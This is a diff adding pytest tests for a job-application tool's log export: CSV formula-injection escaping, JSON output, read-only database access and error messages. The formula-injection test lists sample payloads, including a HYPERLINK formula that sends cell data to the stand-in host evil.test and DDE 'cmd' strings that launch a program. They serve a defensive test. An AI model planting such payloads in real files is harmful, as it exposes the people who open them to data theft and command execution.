@@ -10,7 +10,10 @@ nothing is submitted anywhere.
 from __future__ import annotations
 
 import csv
+import io
 import json
+import os
+import sqlite3
 from contextlib import AbstractContextManager, nullcontext
 from pathlib import Path
 from typing import Any, Iterator
@@ -39,6 +42,11 @@ from tests.api_support import (
 )
 
 SECOND_LISTING = "https://www.linkedin.com/jobs/view/2/"
+
+
+def _csv_rows(text: str) -> list[dict[str, str]]:
+    """Parse an export as a CSV document, embedded newlines and all."""
+    return list(csv.DictReader(io.StringIO(text)))
 
 
 class Console:
@@ -1037,6 +1045,196 @@ class TestExportLog:
 
         assert code == 1
         assert "could not be written" in console.text
+
+    @pytest.mark.parametrize(
+        "label",
+        [
+            "=HYPERLINK(\"http://evil.test?\"&A1,\"click\")",
+            "+1+cmd|' /C calc'!A0",
+            "-2+3+cmd|' /C calc'!A0",
+            "@SUM(1+9)*cmd|' /C calc'!A0",
+            "\tleading tab",
+            "\rleading carriage return",
+        ],
+    )
+    def test_a_dangerous_label_cannot_become_a_spreadsheet_formula(
+        self, tmp_path: Path, label: str
+    ) -> None:
+        """Field labels come from the page, and the page is not ours.
+
+        A CSV cell beginning with `=`, `+`, `-`, `@`, a tab, or a carriage
+        return is executed as a formula by Excel and LibreOffice when the
+        file is opened. The label of a question on someone's application
+        form is attacker-controlled text on a hostile listing, and the
+        operator opening their own export is exactly the person with the
+        access worth stealing.
+        """
+        settings = self._database_with_field(tmp_path, label=label, value="Ada")
+        console = Console()
+
+        export_log.main(
+            ["--format", "csv", "--fields"], settings=settings, writer=console.write
+        )
+
+        # Parsed as a CSV document rather than by splitting lines: a cell
+        # holding a carriage return is quoted, and splitting would tear it.
+        row = _csv_rows(console.text)[0]
+        assert row["label"] == "'" + label
+
+    def test_a_dangerous_answer_is_escaped_when_values_are_exported(
+        self, tmp_path: Path
+    ) -> None:
+        """Answers are typed by a model or a human; neither is a formula."""
+        settings = self._database_with_field(
+            tmp_path, label="Phone", value="=1+1"
+        ).model_copy(update={"log_field_values": True})
+        console = Console()
+
+        export_log.main(
+            ["--format", "csv", "--fields", "--include-values"],
+            settings=settings,
+            writer=console.write,
+        )
+
+        row = list(csv.DictReader(console.text.splitlines()))[0]
+        assert row["value"] == "'=1+1"
+
+    def test_an_ordinary_cell_is_left_exactly_as_it_is(
+        self, exported: Settings
+    ) -> None:
+        """Escaping everything would make every export wrong instead."""
+        console = Console()
+
+        export_log.main(
+            ["--format", "csv", "--fields"], settings=exported, writer=console.write
+        )
+
+        row = list(csv.DictReader(console.text.splitlines()))[0]
+        assert row["listing_url"] == LISTING_URL
+        assert row["label"] == "Email"
+        assert row["model_cost"] == "0.25"
+        assert row["stable_key"] == "frame|input|email"
+
+    def test_json_export_does_not_escape_anything(self, tmp_path: Path) -> None:
+        """The quote is a spreadsheet convention, and JSON is not one.
+
+        Adding it there would corrupt the value for every program that
+        reads JSON properly, to defend against a risk JSON does not have.
+        """
+        settings = self._database_with_field(tmp_path, label="=1+1", value="Ada")
+        console = Console()
+
+        export_log.main(
+            ["--format", "json", "--fields"], settings=settings, writer=console.write
+        )
+
+        assert console.json()["applications"][0]["fields"][0]["label"] == "=1+1"
+
+    def _database_with_field(
+        self, tmp_path: Path, *, label: str, value: str
+    ) -> Settings:
+        settings = Settings(
+            _env_file=None,
+            sqlite_path=tmp_path / "jobs.db",
+            artifacts_path=tmp_path / "artifacts",
+        )
+        from app.storage.db import Database
+
+        db = Database(settings)
+        db.initialize()
+        queue_id = db.enqueue_job(LISTING_URL, Board.LINKEDIN)
+        application_id = db.create_application(
+            queue_id=queue_id,
+            thread_id=thread_id_for(queue_id),
+            status=ApplicationStatus.AWAITING_APPROVAL,
+        )
+        db.save_application_field(
+            application_id=application_id,
+            stable_key="frame|input|q",
+            source=FieldSource.LLM,
+            required=True,
+            filled=True,
+            value=value,
+            metadata={"label": label},
+        )
+        return settings
+
+    def test_the_export_leaves_the_database_byte_for_byte_alone(
+        self, exported: Settings
+    ) -> None:
+        """Reading a log must not be a way to alter or migrate it.
+
+        The export used to call `initialize()`, which opens the database
+        for writing and applies every schema statement — a read command
+        that could rewrite the thing being read, and that turned a mistyped
+        path into a new empty database.
+        """
+        before = exported.sqlite_path.read_bytes()
+
+        code = export_log.main(
+            ["--format", "json"], settings=exported, writer=lambda line: None
+        )
+
+        assert code == 0
+        assert exported.sqlite_path.read_bytes() == before
+        assert not (exported.sqlite_path.parent / "jobs.db-journal").exists()
+
+    @pytest.mark.skipif(
+        os.geteuid() == 0, reason="root ignores the write bit this test removes"
+    )
+    def test_a_write_protected_database_can_still_be_exported(
+        self, exported: Settings
+    ) -> None:
+        """A backup on read-only media is a normal thing to export from."""
+        exported.sqlite_path.chmod(0o444)
+        console = Console()
+        try:
+            code = export_log.main(
+                ["--format", "json"], settings=exported, writer=console.write
+            )
+        finally:
+            exported.sqlite_path.chmod(0o644)
+
+        assert code == 0
+        assert console.json()["applications"][0]["listing_url"] == LISTING_URL
+
+    def test_a_file_that_is_not_a_database_is_reported_plainly(
+        self, tmp_path: Path
+    ) -> None:
+        path = tmp_path / "jobs.db"
+        path.write_text("this is a shopping list, not a database\n")
+        settings = Settings(
+            _env_file=None, sqlite_path=path, artifacts_path=tmp_path / "artifacts"
+        )
+        console = Console()
+
+        code = export_log.main([], settings=settings, writer=console.write)
+
+        assert code == 1
+        assert str(path) in console.text
+        assert "not a SQLite database" in console.text
+        assert "Traceback" not in console.text
+
+    def test_a_database_without_the_log_tables_is_reported_plainly(
+        self, tmp_path: Path
+    ) -> None:
+        """Someone else's SQLite file, or a path that once held one."""
+        path = tmp_path / "jobs.db"
+        conn = sqlite3.connect(path)
+        conn.execute("CREATE TABLE recipes (name TEXT)")
+        conn.commit()
+        conn.close()
+        settings = Settings(
+            _env_file=None, sqlite_path=path, artifacts_path=tmp_path / "artifacts"
+        )
+        console = Console()
+
+        code = export_log.main([], settings=settings, writer=console.write)
+
+        assert code == 1
+        assert str(path) in console.text
+        assert "no such table" in console.text.lower()
+        assert "SQLITE_PATH" in console.text
 
     def test_an_unknown_status_is_a_usage_error(self, exported: Settings) -> None:
         with pytest.raises(SystemExit):
